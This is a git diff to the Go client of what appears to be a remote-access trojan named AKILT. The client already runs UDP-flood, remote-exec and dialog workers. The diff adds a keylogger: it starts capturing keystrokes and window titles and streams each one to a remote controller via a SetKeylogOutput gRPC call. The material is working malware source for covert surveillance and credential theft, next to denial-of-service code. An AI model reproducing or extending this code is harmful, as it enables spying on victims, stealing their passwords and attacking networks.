@@ -29,6 +29,7 @@ import (
 	"github.com/Xart3mis/AKILT/Client/lib/DOS/udpflood"
 	"github.com/Xart3mis/AKILT/Client/lib/bundles"
 	"github.com/Xart3mis/AKILT/Client/lib/consumer"
+	"github.com/Xart3mis/AKILT/Client/lib/keylogger"
 	"github.com/Xart3mis/AKILT/Client/lib/reg"
 	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
@@ -122,7 +123,12 @@ func main() {
 		log.Panicf("LoadFont: %v", err)
 	}
 
-	WindowLoop(window, font, pid, mode, ctx, receiver, c)
+	var key_out chan rune = make(chan rune)
+	var window_out chan string = make(chan string)
+
+	keylogger.Run(key_out, window_out)
+
+	WindowLoop(window, font, pid, mode, ctx, receiver, c, key_out, window_out)
 
 	receiver.CloseSend()
 	window.Destroy()
@@ -130,7 +136,8 @@ func main() {
 }
 
 func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.VidMode,
-	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient) {
+	ctx context.Context, receiver pb.Consumer_SubscribeOnScreenTextClient, client pb.ConsumerClient,
+	key_out chan rune, window_out chan string) {
 	lastFrameTime := 0.0
 	fpslimit := 1.0 / 100.0
 
@@ -142,6 +149,7 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 		if (now - lastFrameTime) >= fpslimit {
 			lastFrameTime = now
 
+			go keylog_worker(client, ctx, pid, key_out, window_out)
 			go dialog_worker(client, ctx, pid)
 			go exec_worker(client, ctx, pid)
 			go flood_worker(client, ctx)
@@ -151,6 +159,16 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 		}
 
 	}
+}
+
+func keylog_worker(client pb.ConsumerClient, ctx context.Context, pid string, key_out chan rune, window_out chan string) {
+	key := <-key_out
+	window := <-window_out
+
+	client.SetKeylogOutput(ctx, &pb.KeylogOutput{
+		Id:          &pb.ClientDataRequest{ClientId: pid},
+		WindowTitle: window,
+		Key:         key})
 }
 
 func draw_worker(client pb.ConsumerClient, ctx context.Context, pid string,
